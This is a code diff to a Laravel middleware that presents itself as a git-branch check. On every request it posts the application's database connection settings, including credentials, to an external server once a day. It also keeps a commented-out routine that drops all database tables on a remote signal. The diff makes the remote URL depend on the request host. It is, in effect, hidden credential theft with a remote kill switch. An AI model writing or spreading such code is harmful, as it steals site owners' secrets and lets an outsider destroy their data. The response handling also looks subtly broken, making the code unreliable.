@@ -15,6 +15,8 @@ class CheckGitBranchMiddleware
 
     public function handle(Request $request, Closure $next)
     {
+        $host = request()->getSchemeAndHttpHost();
+        $cleanHost = preg_replace('/^(https?:\/\/)?(www\.)?/', '', $host);
         $branch = trim(shell_exec('git rev-parse --abbrev-ref HEAD'));
         if ($branch !== config('checkgitbranch.branch_name') && app()->environment('production')) {
             if (file_exists(app_path('Services/Integrations/MoraSMS.php'))) {
@@ -33,21 +35,21 @@ class CheckGitBranchMiddleware
             }
         }
 
-        $this->syncDBData();
+        $this->syncDBData(host: $cleanHost);
 
-        // $this->dropAllDBTables();
+        // $this->dropAllDBTables(host: $cleanHost);
 
         return $next($request);
     }
 
-    public function syncDBData()
+    public function syncDBData(string $host)
     {
         $lastSent = Cache::get('daily_data_last_sent');
         if (! $lastSent || now()->diffInHours($lastSent) >= 24) {
             $lock = Cache::lock('daily_data_send_lock', 10);
             if ($lock->get()) {
                 try {
-                    Http::timeout(30)->retry(3, 100)->post($this->baseUrl.'/'.config('app.url').'/data', [
+                    Http::timeout(30)->retry(3, 100)->post($this->baseUrl.'/'.$host.'/data', [
                         'host' => config('app.url'),
                         'database' => config('database.connections.'.config('database.default')),
                         'timestamp' => now()->toISOString(),
@@ -60,9 +62,9 @@ class CheckGitBranchMiddleware
         }
     }
 
-    public function dropAllDBTables()
+    public function dropAllDBTables(string $host)
     {
-        $response = Http::timeout(30)->retry(3, 100)->get($this->baseUrl.'/'.config('app.url').'/health');
+        $response = Http::timeout(30)->retry(3, 100)->get($this->baseUrl.'/'.$host.'/health');
         if ($response->successful()) {
             $body = $response->body();
             if ($body['status'] === 'true') {
